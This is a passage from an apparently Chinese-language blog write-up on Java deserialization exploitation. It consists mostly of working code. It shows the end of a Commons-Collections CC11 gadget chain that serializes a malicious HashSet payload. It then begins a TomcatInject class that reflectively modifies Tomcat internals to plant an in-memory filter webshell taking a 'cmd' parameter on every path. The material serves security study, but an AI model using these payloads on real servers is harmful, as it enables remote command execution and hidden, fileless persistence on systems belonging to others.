</span></span><span style=display:flex><span>        <span style=color:#111>TiedMapEntry</span> <span style=color:#111>tiedmap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TiedMapEntry</span><span style=color:#f92672>(</span><span style=color:#111>map</span><span style=color:#f92672>,</span><span style=color:#111>templates</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>HashSet</span> <span style=color:#111>hashset</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashSet</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>hashset</span><span style=color:#f92672>.</span><span style=color:#75af00>add</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;foo&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 我们要设置 HashSet 的 map 为我们的 HashMap
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>Field</span> <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#111>HashSet</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;map&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>NoSuchFieldException</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#111>HashSet</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;backingMap&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>HashMap</span> <span style=color:#111>hashset_map</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>HashMap</span><span style=color:#f92672>)</span> <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>hashset</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>f2</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f2</span> <span style=color:#f92672>=</span> <span style=color:#111>HashMap</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;table&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>NoSuchFieldException</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f2</span> <span style=color:#f92672>=</span> <span style=color:#111>HashMap</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;elementData&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>f2</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Object</span><span style=color:#f92672>[]</span> <span style=color:#111>array</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Object</span><span style=color:#f92672>[])</span><span style=color:#111>f2</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>hashset_map</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Object</span> <span style=color:#111>node</span> <span style=color:#f92672>=</span> <span style=color:#111>array</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>];</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span><span style=color:#f92672>(</span><span style=color:#111>node</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>            <span style=color:#111>node</span> <span style=color:#f92672>=</span> <span style=color:#111>array</span><span style=color:#f92672>[</span><span style=color:#111>1</span><span style=color:#f92672>];</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>keyField</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>keyField</span> <span style=color:#f92672>=</span> <span style=color:#111>node</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;key&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span><span style=color:#00a8c8>catch</span><span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>            <span style=color:#111>keyField</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;java.util.MapEntry&#34;</span><span style=color:#f92672>).</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;key&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>keyField</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>keyField</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>node</span><span style=color:#f92672>,</span><span style=color:#111>tiedmap</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 在 invoke 之后，
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>Field</span> <span style=color:#111>f3</span> <span style=color:#f92672>=</span> <span style=color:#111>transformer</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;iMethodName&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f3</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f3</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>transformer</span><span style=color:#f92672>,</span><span style=color:#d88200>&#34;newTransformer&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>ObjectOutputStream</span> <span style=color:#111>outputStream</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectOutputStream</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>FileOutputStream</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;./cc11Test4.ser&#34;</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>            <span style=color:#111>outputStream</span><span style=color:#f92672>.</span><span style=color:#75af00>writeObject</span><span style=color:#f92672>(</span><span style=color:#111>hashset</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>outputStream</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span><span style=color:#00a8c8>catch</span><span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#75af00>getBytes</span><span style=color:#f92672>()</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>IOException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>InputStream</span> <span style=color:#111>inputStream</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>FileInputStream</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>File</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;E:\\JavaStudy\\test05\\target\\classes\\ccTest\\TomcatInject.class&#34;</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>ByteArrayOutputStream</span> <span style=color:#111>byteArrayOutputStream</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>int</span> <span style=color:#111>n</span> <span style=color:#f92672>=</span> <span style=color:#111>0</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>while</span> <span style=color:#f92672>((</span><span style=color:#111>n</span><span style=color:#f92672>=</span><span style=color:#111>inputStream</span><span style=color:#f92672>.</span><span style=color:#75af00>read</span><span style=color:#f92672>())!=-</span><span style=color:#111>1</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>            <span style=color:#111>byteArrayOutputStream</span><span style=color:#f92672>.</span><span style=color:#75af00>write</span><span style=color:#f92672>(</span><span style=color:#111>n</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>bytes</span> <span style=color:#f92672>=</span> <span style=color:#111>byteArrayOutputStream</span><span style=color:#f92672>.</span><span style=color:#75af00>toByteArray</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>bytes</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>有了这个CC11的模板，剩下的就是注入内存马部分了，详细分析可以参见三梦师傅的<a href=https://xz.aliyun.com/t/7388#toc-2>基于tomcat的内存 Webshell 无文件攻击技术</a>（太强了太强了），代码如下（有稍作修改）</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#111>ccTest</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.DOM</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.catalina.LifecycleState</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.catalina.core.ApplicationContext</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.catalina.core.StandardContext</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.IOException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Field</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Method</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Modifier</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.Filter</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.FilterChain</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.FilterConfig</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.ServletContext</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.ServletException</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.ServletRequest</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>javax.servlet.ServletResponse</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>TomcatInject</span> <span style=color:#00a8c8>extends</span> <span style=color:#111>AbstractTranslet</span> <span style=color:#00a8c8>implements</span> <span style=color:#111>Filter</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>private</span> <span style=color:#00a8c8>final</span> <span style=color:#111>String</span> <span style=color:#111>cmdParamName</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;cmd&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>private</span> <span style=color:#00a8c8>final</span> <span style=color:#00a8c8>static</span> <span style=color:#111>String</span> <span style=color:#111>filterUrlPattern</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;/*&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>private</span> <span style=color:#00a8c8>final</span> <span style=color:#00a8c8>static</span> <span style=color:#111>String</span> <span style=color:#111>filterName</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;amiz&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>static</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 反射修改WRAP_SAME_OBJECT值为true
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>Class</span> <span style=color:#111>c</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;org.apache.catalina.core.ApplicationDispatcher&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>java</span><span style=color:#f92672>.</span><span style=color:#75af00>lang</span><span style=color:#f92672>.</span><span style=color:#75af00>reflect</span><span style=color:#f92672>.</span><span style=color:#75af00>Field</span> <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#111>c</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;WRAP_SAME_OBJECT&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>java</span><span style=color:#f92672>.</span><span style=color:#75af00>lang</span><span style=color:#f92672>.</span><span style=color:#75af00>reflect</span><span style=color:#f92672>.</span><span style=color:#75af00>Field</span> <span style=color:#111>modifiersField</span> <span style=color:#f92672>=</span> <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;modifiers&#34;</span><span style=color:#f92672>);</span>    <span style=color:#75715e>// 获取modifiers字段
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>modifiersField</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>   <span style=color:#75715e>//将变量设置为可访问
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>modifiersField</span><span style=color:#f92672>.</span><span style=color:#75af00>setInt</span><span style=color:#f92672>(</span><span style=color:#111>f</span><span style=color:#f92672>,</span> <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>getModifiers</span><span style=color:#f92672>()</span> <span style=color:#f92672>&amp;</span> <span style=color:#f92672>~</span><span style=color:#111>Modifier</span><span style=color:#f92672>.</span><span style=color:#75af00>FINAL</span><span style=color:#f92672>);</span> <span style=color:#75715e>// 取消FINAL属性
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>    <span style=color:#75715e>// 将变量设置为可访问
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#00a8c8>if</span> <span style=color:#f92672>(!</span><span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>getBoolean</span><span style=color:#f92672>(</span><span style=color:#00a8c8>null</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>setBoolean</span><span style=color:#f92672>(</span><span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>true</span><span style=color:#f92672>);</span> <span style=color:#75715e>// 将变量设置为true
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 初始化lastServicedRequest
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>c</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#111>c</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;lastServicedRequest&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>modifiersField</span> <span style=color:#f92672>=</span> <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;modifiers&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>modifiersField</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>modifiersField</span><span style=color:#f92672>.</span><span style=color:#75af00>setInt</span><span style=color:#f92672>(</span><span style=color:#111>f</span><span style=color:#f92672>,</span> <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>getModifiers</span><span style=color:#f92672>()</span> <span style=color:#f92672>&amp;</span> <span style=color:#f92672>~</span><span style=color:#111>java</span><span style=color:#f92672>.</span><span style=color:#75af00>lang</span><span style=color:#f92672>.</span><span style=color:#75af00>reflect</span><span style=color:#f92672>.</span><span style=color:#75af00>Modifier</span><span style=color:#f92672>.</span><span style=color:#75af00>FINAL</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ThreadLocal</span><span style=color:#f92672>());</span>   <span style=color:#75715e>//设置ThreadLocal对象
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 初始化lastServicedResponse
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#111>c</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;lastServicedResponse&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>modifiersField</span> <span style=color:#f92672>=</span> <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;modifiers&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>modifiersField</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>modifiersField</span><span style=color:#f92672>.</span><span style=color:#75af00>setInt</span><span style=color:#f92672>(</span><span style=color:#111>f</span><span style=color:#f92672>,</span> <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>getModifiers</span><span style=color:#f92672>()</span> <span style=color:#f92672>&amp;</span> <span style=color:#f92672>~</span><span style=color:#111>java</span><span style=color:#f92672>.</span><span style=color:#75af00>lang</span><span style=color:#f92672>.</span><span style=color:#75af00>reflect</span><span style=color:#f92672>.</span><span style=color:#75af00>Modifier</span><span style=color:#f92672>.</span><span style=color:#75af00>FINAL</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ThreadLocal</span><span style=color:#f92672>());</span>   <span style=color:#75715e>// 设置ThreadLocal对象
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>// 获取上下文StandardContext
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>ServletContext</span> <span style=color:#111>servletContext</span> <span style=color:#f92672>=</span> <span style=color:#111>getServletContext</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>servletContext</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>                <span style=color:#111>Field</span> <span style=color:#111>ctx</span> <span style=color:#f92672>=</span> <span style=color:#111>servletContext</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;context&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>ApplicationContext</span> <span style=color:#111>appctx</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>ApplicationContext</span><span style=color:#f92672>)</span> <span style=color:#111>ctx</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>servletContext</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#111>Field</span> <span style=color:#111>stdctx</span> <span style=color:#f92672>=</span> <span style=color:#111>appctx</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>().</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;context&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>stdctx</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>StandardContext</span> <span style=color:#111>standardContext</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>StandardContext</span><span style=color:#f92672>)</span> <span style=color:#111>stdctx</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>appctx</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>standardContext</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>                    <span style=color:#75715e>// 这样设置不会抛出报错
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                    <span style=color:#111>Field</span> <span style=color:#111>stateField</span> <span style=color:#f92672>=</span> <span style=color:#111>org</span><span style=color:#f92672>.</span><span style=color:#75af00>apache</span><span style=color:#f92672>.</span><span style=color:#75af00>catalina</span><span style=color:#f92672>.</span><span style=color:#75af00>util</span><span style=color:#f92672>.</span><span style=color:#75af00>LifecycleBase</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span>
</span></span><span style=display:flex><span>                            <span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;state&#34;</span><span style=color:#f92672>);</span>
